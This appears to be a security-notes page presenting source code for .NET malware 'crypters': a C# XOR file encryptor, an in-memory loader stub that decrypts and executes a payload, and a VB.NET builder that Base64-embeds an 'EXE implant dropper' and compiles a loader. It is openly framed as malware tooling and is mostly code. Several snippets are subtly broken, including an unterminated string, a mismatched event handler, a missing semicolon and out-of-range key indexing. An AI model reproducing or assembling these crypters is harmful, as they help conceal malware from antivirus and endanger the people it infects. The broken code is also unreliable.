# DotNET

## C\#

TODO: Understand the whole writeup and re-rewrite it.

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;

namespace Crypter {
    class Program {
		private static byte[] encodeBytes(byte[] bytes, String pass) {
		    byte[] XorBytes = Encoding.Unicode.GetBytes(pass);
		
		    for (int i = 0; i < bytes.Length; i++) {
		        bytes[i] ^= XorBytes[i % 16];
		    }
		
		    return bytes;
		}
        static void Main(string[] args) {
            // No Arguments -> Exit
            if (args.Length < 2) {
                Console.WriteLine("Syntax: crypter.exe <Exe/Dll to get Encrypted> <Password> (Optional: output file name)");
                Environment.Exit(0);
            }

            String file = args[0];
            String pass = args[1];
            String outFile = "Crypted.exe";

            // If Output Name is specified -> Set it
            if (args.Length == 3) {
                outFile = args[2];
            }

            //File doesn't exist -> Exit
            if (!File.Exists(file)) {
                Console.WriteLine("[!] The selected File doesn't exist!");
                Environment.Exit(0);
            }

            //Everything seems fine -> Reading bytes
            Console.WriteLine("[*] Reading Data...");
            byte[] plainBytes = File.ReadAllBytes(file);

            //Yep, got bytes -> Encoding
            Console.WriteLine("[*] Encoding Data...");
            byte[] encodedBytes = encodeBytes(plainBytes, pass);

            Console.Write("[*] Save to Output File... ");
            File.WriteAllBytes(outFile, encodedBytes);
            Console.WriteLine("Done!");

            Console.WriteLine("\n[*] File successfully encoded!");
        }
    }
}
```

### Source of the Stub

Itâ€™s a rather bad implementation, since you have to hard-code the filenames and the encryption password. Anyway, this is more of a proof-of-concept. C# is not very useful in the production of malware.

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.IO;
using System.Text;
using System.Reflection;
using System.Diagnostics;

namespace Stub {
    static class Program {
        /// <summary>
        /// MAIN
        /// </summary>
        [STAThread]
        static void Main() {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());

            //Set Payload File and Password HERE
            RunInternalExe("Crypted.exe", "password");
        }

        private static void RunInternalExe(string exeName, String pass) {
            //Verify the Payload exists
            if (!File.Exists(exeName))
                return;

            //Read the raw bytes of the file
            byte[] resourcesBuffer = File.ReadAllBytes(exeName);

            //Decrypt bytes from payload
            byte[] decryptedBuffer = null;
            decryptedBuffer = decryptBytes(resourcesBuffer, pass);

            //If .NET executable -> Run
            if(Encoding.Unicode.GetString(decryptedBuffer).Contains("</assembly>"))
            {
                //Load the bytes as an assembly
                Assembly exeAssembly = Assembly.Load(decryptedBuffer);

                //Execute the assembly
                object[] parameters = new object[1];                //Don't know why but fixes TargetParameterCountException
                exeAssembly.EntryPoint.Invoke(null, parameters);
            }
        }

        /// <summary>
        /// Decrypt the Loaded Assembly Bytes
        /// </summary>
        /// <param name="payload"></param>
        /// <returns>Decrypted Bytes</returns>
        private static byte[] decryptBytes(byte[] bytes, String pass) {
            byte[] XorBytes = Encoding.Unicode.GetBytes(pass);

            for (int i = 0; i < bytes.Length; i++) {
                bytes[i] ^= XorBytes[i % 16];
            }

            return bytes;
        }
    }
}
```

## VB.NET

```vb.net
Imports System.CodeDom.Compiler
Imports System.IO

Public Class Crypter
    ' Opens the EXE implant dropper that will be used to execute
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim Op As New OpenFileDialog()
        Op.Filter = "Exe File | *.exe"
        If Op.ShowDialog = DialogResult.OK Then
            TextBox1.Text = Op.FileName
        End If
    End Sub

    ' Encode the EXE implant dropper with Base64 as the stub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim Sv As New SaveFileDialog()
        Sv.Filter = "Exe File | *.exe"
            If Sv.ShowDialog = DialogResult.OK Then
                Codedom(Sv.FileName, My.Resources.Stub.Replace("%Str%", Convert.ToBase64String(File.ReadAllBytes(TextBox1.Text))), "Class1")
            End If
    End Sub

    ' Compile the crypter (base64 encoded with EXE implant dropper)
    Sub Codedom(ByVal Path As String, ByVal Code As String, ByVal MainClass As String)
        Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New Microsoft.CSharp.CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions += "/platform:x86 /unsafe /target:winexe
            .MainClass = MainClass
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
            .ReferencedAssemblies.Add("System.Linq.dll")
            .ReferencedAssemblies.Add("System.Core.dll")
            .ReferencedAssemblies.Add("System.Data.dll")
            .ReferencedAssemblies.Add("System.Deployment.dll")
            .ReferencedAssemblies.Add("System.Drawing.dll")
            .ReferencedAssemblies.Add("System.Xml.dll")
            .ReferencedAssemblies.Add("System.Xml.Linq.dll")
            .ReferencedAssemblies.Add("Microsoft.CSharp.dll")
            .ReferencedAssemblies.Add("System.dll")
        End With

        Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
        If Results.Errors.Count > 0 Then
            For Each E In Results.Errors
                MsgBox(E.ErrorText)
            Next
        End If
    End Sub
End Class
```

Using C# payload as the stub.

```cs
using System;

static class Class1 {
    static void Main() {
        string s1 = "%Str%"
        AppDomain.CurrentDomain.Load(Convert.FromBase64String(s1)).EntryPoint.Invoke("", null);
    }
}
```

---
## References

### 0x00sec

- [0x00sec: [C#] A Simple Runtime Crypter](https://0x00sec.org/t/c-a-simple-runtime-crypter/519)